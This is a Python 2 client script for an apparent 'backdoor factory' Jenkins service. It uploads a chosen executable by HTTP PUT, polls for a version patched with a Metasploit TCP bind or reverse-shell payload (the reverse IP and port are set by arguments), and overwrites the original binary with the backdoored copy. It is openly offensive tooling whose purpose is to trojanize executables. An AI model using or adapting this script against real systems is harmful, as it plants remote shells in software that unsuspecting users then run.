#!/usr/bin/python
import argparse
import os
import sys
import time
import uuid
import urllib2

# configure
parser = argparse.ArgumentParser()
parser.add_argument('b', help='full path to target binary')
parser.add_argument('s', help='Jenkins/backdoor factory server name or IP, e.g. some.domain.com or 1.2.3.4')
parser.add_argument('o', help='OS type: 0 = Linux/x86, 1 = Windows/x86', type=int)
parser.add_argument('pay', help='payload type: 0 = MSF TCP Bind (requires -port), 1 = MSF TCP Reverse (requires -rip & -port)', type=int)
parser.add_argument('port', help='MSF TCP Bind/Reverse Shell Port Number', type=int)
parser.add_argument('-rip', help='MSF TCP reverse payload IP address')

args = parser.parse_args()

binaryPath = args.b
hostIP = 'http://' + args.s
indir = '/in/'
outdir = '/out/'
osType = args.o
payloadType = args.pay
payloadPort = args.port
if args.pay == 1:
    if not args.rip:
        print '-rip parameter required when using MSF TCP Reverse Shell Payload'
        parser.print_help()
        sys.exit(1)
    else:
        reverseIP = args.rip


# modify subclass urllib2.Request to support defining HTTP method in constructor
class MethodRequest(urllib2.Request):
    def __init__(self, *args, **kwargs):
        if 'method' in kwargs:
            self._method = kwargs['method']
            del kwargs['method']
        else:
            self._method = None
        return urllib2.Request.__init__(self, *args, **kwargs)

    def get_method(self, *args, **kwargs):
        if self._method is not None:
            return self._method
        return urllib2.Request.get_method(self, *args, **kwargs)

# file info
fileLocation = os.path.dirname(binaryPath)
if os.name == 'posix':
    fileLocation += '/'
if os.name == 'nt':
    fileLocation += '\\'
fileName = os.path.basename(binaryPath)
uploadFileName = str(uuid.uuid4())
print '[*]name is ' + fileLocation + fileName
print '[*]uploading ' + uploadFileName

# read file
fileData = file(binaryPath).read()

# put file
uploadURL = hostIP + indir + uploadFileName
'[*] PUT file...' + uploadURL
req = MethodRequest(url=uploadURL, method='PUT', data=fileData)
res = urllib2.urlopen(req)

# trigger Jenkins job
if res.getcode() == 201:
    print '[*] SUCCESS'
    # call URL with params

# poll for backdoor file for 2 minutes, every 30 seconds
endTime = time.time() + 120 
downloadURL = hostIP + outdir + uploadFileName
while time.time() < endTime:
    print '[*] trying to get file...' + downloadURL
    try:
        f = urllib2.urlopen(downloadURL)
        if f.getcode() == 200:
            data = f.read()
            writeName = os.path.join(fileLocation, fileName)
            print 'writing to...' + writeName
            with open(writeName, "wb") as code:
                code.write(data)
                '[*] wrote file'
                break
        else:
            print '[*] didn\'t get file...sleeping'
            time.sleep(30)
    except:
        time.sleep(30)